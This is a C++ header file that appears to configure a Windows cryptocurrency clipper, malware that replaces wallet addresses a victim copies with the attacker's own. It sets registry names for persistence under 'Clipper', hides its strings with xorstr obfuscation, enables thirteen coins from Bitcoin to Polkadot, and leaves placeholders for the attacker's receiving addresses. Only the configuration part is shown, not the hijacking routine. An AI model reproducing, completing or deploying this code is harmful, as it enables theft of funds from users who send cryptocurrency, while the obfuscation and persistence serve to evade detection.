#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include <exception>
#include <iostream>
#include <ostream>
#include <stdexcept>
#include <string>
#include <windows.h>
#include <chrono>
#include <thread>
#include <shlobj.h>
#include <exception>
#include <typeinfo>
#include <stdexcept>
#include <ctime>
#include <filesystem>
#include <regex>

#include "xorstr.h"

/* Registry Settings */
std::string path = xorstr("Clipper");
std::string name = xorstr("Clipper");
std::string exe = xorstr("Clipper.exe");

/* Program Settings */
// Add "//" in front of the next line to disable debugging!!
#define DEBUGGING

bool m_btc = true;
bool m_ltc = true;
bool m_xmr = true;
bool m_eth = true;
bool m_xrp = true;
bool m_neo = true;
bool m_bch = true;
bool m_doge = true;
bool m_dash = true;
bool m_tron = true;
bool m_bnb = true;
bool m_ada = true;
bool m_dot = true;

std::string btc = xorstr("btc addy");
std::string ltc = xorstr("ltc addy");
std::string xmr = xorstr("xmr addy");
std::string eth = xorstr("eth addy");
std::string xrp = xorstr("xrp addy");
std::string neo = xorstr("neo addy");
std::string bch = xorstr("bch addy");
std::string doge = xorstr("doge addy");
std::string dash = xorstr("dash addy");
std::string tron = xorstr("tron addy");
std::string bnb = xorstr("bnb addy");
std::string ada = xorstr("ada addy");
std::string dot = xorstr("dot addy");